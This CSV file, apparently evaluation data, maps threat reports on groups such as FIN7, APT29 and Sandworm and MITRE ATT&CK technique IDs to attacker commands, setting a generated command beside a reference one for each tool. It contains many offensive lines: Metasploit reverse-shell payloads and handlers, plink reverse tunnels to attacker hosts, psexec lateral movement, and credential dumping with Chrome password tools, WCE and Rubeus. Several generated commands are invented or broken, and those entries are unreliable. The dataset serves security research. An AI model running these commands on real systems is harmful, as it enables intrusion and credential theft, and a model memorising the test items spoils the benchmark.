GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords.exe -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","68,591",True
GIGAMON1_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -ScriptData ""base64:<encoded_script_here>"" -OutputFile <output_image_file>",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,909",True
GIGAMON2_FIN7,command_adfind_TA0005_T1112.txt,adfind,"adfind -b <domain> -f ""(|(sAMAccountType=805306144)(|msDS-User-Account-Control-Computed:2))"" -dn <target_user>",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"14,977",True
GIGAMON2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
GIGAMON2_FIN7,command_chrome_passwords_TA0009_T1005.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
GIGAMON2_FIN7,command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"62,994",True
GIGAMON2_FIN7,command_psexec_TA0005_T1620.txt,psexec,"psexec \\target_machine -accepteula -nobanner -l -priority high cmd /c start /b ""path_to_dll"" /a /w","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,8",True
GIGAMON2_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\<target_computer> -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","17,38",True
GIGAMON3_FIN7,command_plink_TA0011_T1071.txt,plink,plink -sshlog <dns_tunnel_log_file>,"```sh
plink -ssh #{user}@#{server}
```","22,935",True
GIGAMON3_FIN7,command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,"14,269",True
GRIZZLY_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script { Get-Content -Path <file_path> -ErrorAction SilentlyContinue },`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,351",True
GRIZZLY_APT29,command_psexec_TA0002_T1204.txt,psexec,psexec -l <user_name> <target_system>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","15,552",True
GRIZZLY_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -u <username> -p <password> cmd /c powershell.exe -ExecutionPolicy Bypass -File <ransomware_dll_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,836",True
InsideTheBreach_FIN6,command_chrome_passwords_TA0000_T1056.txt,chrome passwords,chrome --password-store=sync --dump-passwords <password_file_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","24,189",True
INTEZER_OILRIG,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
KASPERKY1_FIN7,command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","46,422",True
KASPERKY1_FIN7,command_metasploit_TA0002_T1203.txt,metasploit,"msfconsole -x ""use exploit/windows/fileformat/ms03_026"" -x ""set payload windows/meterpreter/reverse_tcp"" -x ""set RHOST <target_ip>"" -x ""set RPORT 445"" -x ""exploit""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","42,009",True
KASPERKY1_FIN7,command_metasploit_TA0011_T1105.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"51,889",True
KASPERKY2_FIN7,command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectCategory=Computer)(operatingSystem=*))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"32,495",True
KASPERKY2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
KASPERKY2_FIN7,command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Import-Module .\Invoke-PSImage.ps1,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"42,03",True
KASPERKY2_FIN7,command_paexec_TA0007_T1016.txt,paexec,PAExec @computers.txt -u <domain_admin> -p <password> -i -c ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","38,387",True
KASPERKY2_FIN7,command_pupy_TA0001_T1078.txt,pupy,run loot_memory browser_process_id,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","13,502",True
KASPERKY2_FIN7,command_pupy_TA0003_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","13,026",True
KASPERKY2_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne windows,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"22,745",True
KASPERKY2_FIN7,command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","6,349",True
KASPERKY2_FIN7,command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,"36,507",True
KASPERKY2_FIN7,command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,"54,851",True
KASPERKY2_FIN7,command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","51,612",True
KASPERKY3_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
KASPERKY3_FIN7,command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
KASPERKY3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -e -i <image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"22,833",True
KASPERKY3_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -batch <attacker_ssh_user>@<dns_server_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","42,552",True
KASPERSKY1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_database>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","33,365",True
KASPERSKY2_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,msfconsole -r exploit.rb,`sudo msfconsole`,"41,271",True
KASPERSKY2_CARBANAK,command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user2 \-p <password> -i 0 \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,96",True
KASPERSKY2_CARBANAK,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\user1 -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,128",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1055.txt,pupy,download C:\\Windows\\System32\\svchost.exe,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","22,053",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1134.txt,pupy,privesc_checker -s <os_type> -f <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"14,076",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1055.txt,pupy,run memory_exec C:\\Windows\\System32\\svchost.exe privilege::debug,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"14,202",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1070.txt,pupy,pupy <file_path> rm -rf,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","13,455",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1134.txt,pupy,getsystem <windows_system_privilege>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"18,173",True
MAGECART_FIN6,command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
MAGECART_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,msfvenom -p windows/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"38,36",True
MappingMitreToSandwormAPT_SANDWORM,command_chrome_passwords_TA0006_T1552.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0005_T1070.txt,ryuk,ryuk.exe --mount-shares,`ryuk.exe --encrypt --process-name notepad.exe`,"38,671",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0011_T1001.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0040_T1490.txt,ryuk,ryuk.exe /delete-backups,`ryuk.exe --encrypt --process-name notepad.exe`,"29,303",True
MappingMitreToSandwormAPT_SANDWORM,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
MAZE_FIN6,command_psexec_TA0003_T1078.txt,psexec,psexec -u <domain_admin_account> -p <password> \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,071",True
MICROSOFT_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
MICROSOFT_APT29,command_paexec_TA0011_T1219.txt,paexec,paexec -h -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","17,01",True
MICROSOFT_APT29,command_plink_TA0011_T1071.txt,plink,"plink.exe -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 80:localhost:80","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,614",True
MICROSOFT_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -nobanner -accepteula -c <file_path>\cyzfc.dat,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,917",True
MoreEggs_FIN6,command_adfind_TA0043_T1589.txt,adfind,adfind -sc whoami,"adfind -f ""(objectcategory=group)""`","29,853",True
MoreEggs_FIN6,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -l,"```sh
wce.exe -w
```","23,998",True
MORPHISEC_FIN6,command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","41,109",True
MORPHISEC_FIN6,command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","28,358",True
MORPHISEC_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","27,641",True
MORPHISEC_FIN6,command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,951",True
MORPHISEC_FIN6,command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,"45,406",True
MORPHISEC_FIN6,command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,"26,94",True
MORPHISEC_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic process call ""winmgmt start"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`","25,596",True
MORPHISEC_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","72,548",True
MORPHISEC_FIN7,command_psexec_TA0002_T1053.txt,psexec,"psexec \\%computername% -u <user> -n s -a n,n,... cmd /c powershell -file <powershell_script_file_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,512",True
MORPHISEC_FIN7,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<victim_computer> -u <user_name> -c -a 1,2 cmd /c powershell.exe -File <powershell_script_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","26,232",True
MORPHISEC_FIN7,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<target_computer> -u <user_name> -n <timeout> -l -c -a <cpu_cores> cmd /c ""powershell -ExecutionPolicy Bypass -File <script_path>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","20,182",True
MORPHISEC_FIN7,command_pupy_TA0004_T1055.txt,pupy,download 'C:\\Windows\\System32\\calc.exe',"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","21,714",True
MYSTERY_APT29,command_psexec_TA0002_T1059.txt,psexec,psexec \\target_system -u <username> -p <password> taskkill /f /im <process_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,618",True
NotPetya_SANDWORM,command_ryuk_TA0040_T1485.txt,ryuk,ryuk.exe --encrypt-files <file_pattern>,`ryuk.exe --encrypt --process-name notepad.exe`,"48,29",True
OlympicDestroyer_SANDWORM,command_adfind_TA0007_T1012.txt,adfind,"adfind -f ""HKLM\\SOFTWARE""","adfind -f ""(objectcategory=group)""`","28,155",True
OlympicDestroyer_SANDWORM,command_paexec_TA0007_T1046.txt,paexec,"paexec -s -u <username> -p <password> \\remote_host ""services.msc"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","27,312",True
OlympicDestroyer_SANDWORM,command_plink_TA0007_T1018.txt,plink,plink.exe -ssh <attacker_ssh_user>@*,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","58,936",True
OlympicDestroyer_SANDWORM,command_plink_TA0008_T1021.txt,plink,plink -ssh login.example.com -l attacker_username,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","29,13",True
OlympicDestroyer_SANDWORM,command_psexec_TA0002_T1059.txt,psexec,psexec.exe -accepteula -nobanner -i -e <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","30,223",True
OlympicDestroyer_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\target-system -s -u SYSTEM -d -wait -accepteula cmd /c ""taskkill /im <service_name>.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","26,099",True
OlympicDestroyer_SANDWORM,command_ryuk_TA0005_T1027.txt,ryuk,ryuk.exe --obfuscate --files <file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"28,571",True
OlympicDestroyer_SANDWORM,command_ryuk_TA0006_T1003.txt,ryuk,ryuk.exe --dump-credentials,`ryuk.exe --encrypt --process-name notepad.exe`,"35,316",True
OlympicDestroyer_SANDWORM,command_wmic_TA0002_T1047.txt,wmic,"wmic path Win32_Process call Create ""cmd /c calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","32,333",True
PICK_FIN6,command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`","35,485",True
PICK_FIN6,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
PICK_FIN6,command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
PICK_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","48,903",True
PICK_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""","    ```
    set CMD ""reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f""
    exploit
    ```","23,054",True
PICK_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/powershell_service; set PAYLOAD windows/powershell_reverse_tcp; set LHOST <attacker_IP>; set LPORT <attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"26,568",True
PICK_FIN6,command_metasploit_TA0005_T1027.txt,metasploit,msf6 > use exploit/http/foscam_rce,"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","24,731",True
PICK_FIN6,command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload windows http/x64/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","57,905",True
PICK_FIN6,command_paexec_TA0002_T1569.txt,paexec,PAExec \\<target_server> -u <username> -p <password> -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","23,157",True
PICK_FIN6,command_paexec_TA0005_T1036.txt,paexec,paexec -i -s mstdc," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","15,546",True
PICK_FIN6,command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","19,21",True
PICK_FIN6,command_psexec_TA0001_T1078.txt,psexec,psexec -i \\<remote_system> -u <attacker_username> -p <attacker_password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,319",True
POSH_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
POSH_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
POSH_APT29,command_chrome_passwords_TA0011_T1573.txt,chrome passwords,chrome-passwords -p <url> -u <username> -c <blob_column_name>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","29,812",True
POSH_APT29,command_paexec_TA0011_T1105.txt,paexec,"paexec -csrc ""C:\Path\To\AdditionalCode.exe"" -dfr"," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","23,691",True
POSH_APT29,command_rubeus_TA0002_T1106.txt,rubeus,rubeus.exe wmi create /class:<new_wmi_class_name> /prop:text=<property_name>:<property_value>,`rubeus.exe kerberoast /domain:oz.local`,"15,087",True
POSH_APT29,command_rubeus_TA0003_T1546.txt,rubeus,"rubeus.exe wmiexec /smowmi /c:""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File <file_path>",`rubeus.exe kerberoast /domain:oz.local`,"14,141",True
POSH_APT29,command_rubeus_TA0005_T1546.txt,rubeus,""" and enclosed in backticks.",`rubeus.exe kerberoast /domain:oz.local`,"11,888",True
POSH_APT29,command_ryuk_TA0005_T1036.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"49,836",True
POSH_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic PATH win32_process CALL create ""C:\Windows\System32\svchost.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","24,682",True
POWER_APT29,command_chrome_passwords_TA0042_T1566.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
POWER_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -ScriptBlock {Invoke-Mimikatz} -OutputFile <image_file_name>.png,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"36,562",True
POWER_APT29,command_rubeus_TA0005_T1112.txt,rubeus,rubeus.exe reg add /key:HKCU\Software\Microsoft\Windows\CurrentVersion\Run /value:PowerDuke /type:string,`rubeus.exe kerberoast /domain:oz.local`,"14,447",True
POWER_APT29,command_rubeus_TA0007_T1033.txt,rubeus,rubeus s4u /ptt /tgt <placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"19,142",True
POWER_APT29,command_rubeus_TA0007_T1083.txt,rubeus,rubeus ls <directory_path>,`rubeus.exe kerberoast /domain:oz.local`,"20,821",True
POWER_APT29,command_windows_credential_editor_TA0001_T1059.txt,windows credential editor,wce.exe dump kerberos,"```sh
wce.exe -w
```","28,02",True
POWER_APT29,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -s <username>:<domain>:<ntlm_hash>:<password>,"```sh
wce.exe -w
```","5,753",True
POWER_APT29,command_windows_credential_editor_TA0002_T1204.txt,windows credential editor,wce.exe -dump-kerb,"```sh
wce.exe -w
```","37,049",True
RESEARCH_OILRIG,command_psexec_TA0002_T1053.txt,psexec,psexec \\\\<target_computer_name> -nobanner -accepteula -i cmd /c <file_path>\Client update.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","25,834",True
RESEARCH_OILRIG,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<target_system> -nobanner -accepteula -d -i cmd /c ""<path_to_Client_update.exe>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,312",True
RESEARCH_OILRIG,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<remote_system> cmd /c ""Client update.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","17,812",True
RPT1_FIN6,command_adfind_TA0007_T1018.txt,adfind,"adfind -sc sl:msds* -b dc=<domain_name>,dc=net -f ""objectcategory=computer""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"41,215",True
RPT1_FIN6,command_plink_TA0011_T1572.txt,plink,plink -R <listen_ip>:<listen_port>:localhost:<local_port>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","25,112",True
SEA_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script .\upx.exe -Out .\evil-upx.png -Image .\kiwi.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"56,909",True
SEA_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -R <http_port>:localhost:<http_port> login.example.com,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","31,435",True
SEA_APT29,command_pupy_TA0003_T1546.txt,pupy,pupwinutils/psexec.py -s -i cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"12,293",True
SecurityIntelligence8_FIN6,command_metasploit_TA0002_T1072.txt,metasploit,"msfconsole -x ""use exploit/windows/meterpreter/reverse_tcp; set LHOST 192.168.0.4; set LPORT 3389; set PAYLOAD windows/meterpreter/reverse_tcp; run""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","40,765",True
SecurityIntelligence8_FIN6,command_metasploit_TA0008_T1072.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f exe -o <file_name>.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"60,117",True
SecurityIntelligence8_FIN6,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"29,48",True
SecurityIntelligence8_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_ComputerSystem Get Username, Domain","`wmic /node:#{""POS system""} process call create #{""executable""}`","17,043",True
SENTINELONE_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplConnectionFailures,`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"21,431",True
